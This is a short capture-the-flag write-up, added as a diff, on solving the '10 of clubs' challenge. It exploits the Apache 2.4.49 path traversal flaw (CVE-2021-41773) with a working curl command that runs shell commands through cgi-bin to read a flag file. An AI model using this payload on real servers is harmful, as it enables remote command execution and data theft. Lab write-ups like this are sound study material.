@@ -1,0 +1,21 @@
+<h1>10 of clubs</h1>
+
+<blockquote>
+  <p>Solved by: Starry-Lord</p>
+</blockquote>
+
+<p><code>
+port 12380
+</code></p>
+
+<p>This port was using Apache httpd 2.4.49 and I found a good research on the subject here:</p>
+
+<p>https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013</p>
+
+<p>I didn't need to get a shell. ls and cat commands were enough to extract the png:</p>
+
+<p><code>
+curl -vv 'http://172.17.15.117:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo; cat ../secret/safe/flag.png|base64'
+</code></p>
+
+<p><img src="https://i.imgur.com/aYyIBok.png" alt="" /></p>
